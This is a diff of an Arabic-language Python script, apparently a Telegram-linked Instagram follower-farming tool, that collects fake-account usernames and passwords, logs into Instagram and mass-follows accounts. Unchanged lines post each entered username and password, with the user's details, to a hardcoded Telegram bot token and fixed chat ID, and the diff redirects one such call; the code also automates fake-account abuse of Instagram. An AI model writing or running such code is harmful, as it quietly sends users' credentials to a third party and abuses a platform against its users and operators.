@@ -7,10 +7,10 @@ whay = input(' 1- اضافة حساب وهمي بدون تجميع\n 2-تجمي�
 def checker():
   if whay == '1':
         print('يمكنك تجميع النقاط عن طريق ادخال حسابات وهمية او رابط الدعوة \n على كل حساب يمكنك الحصول على 500 نقطة')
-        id=input('ID TELEGRAM:')
-        Username = input('\nUSER FAKE ACC')
-        Password = input('\nPASSWORD FAKE ACC')
-        Youruser=input('\nYOUR INSTAGRAM USER:')
+        id=input('ايدي حسابك تلجرام:')
+        Username = input('\nيوزر الوهمي')
+        Password = input('\nباسوورد الوهمي')
+        Youruser=input('\nيوزرك انستجرام:')
         print('رابط الدعوة الخاص بك هو \n https://t.me/HIMA_FOLLOWERSbot?start='+id)
         url = 'https://www.instagram.com/accounts/login/ajax/'
         headers = {        
@@ -81,8 +81,8 @@ def checker():
             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text= تم تسجيل حساب خاطئ\n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')                    
 checker()
 if whay == '2':
-	username = input('[=] Enter Username : ')
-password = input('[=] Enter Password : ')
+	username = input('[=]يورز الوهمي : ')
+password = input('[=] باسوورد الوهمي : ')
 url = 'https://www.instagram.com/accounts/login/ajax/'
 head = {
 	'accept':'*/*',
@@ -162,9 +162,9 @@ for user in ids1:
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest' }
     follow = requests.post(url3,headers=head3).text
-    sleep(2)
+    sleep(1)
     if '"status":"ok"' in follow:
 	    print('تم متابعة => ' +user)
-	    req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text=تم متابعة {user} بواسطة {username} : {password}')	    	    
+	    req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text=تم متابعة {user} بواسطة {username} : {password}')	    	    
     else:
 	    print(' خطأ بالمتابعة => '+user)	
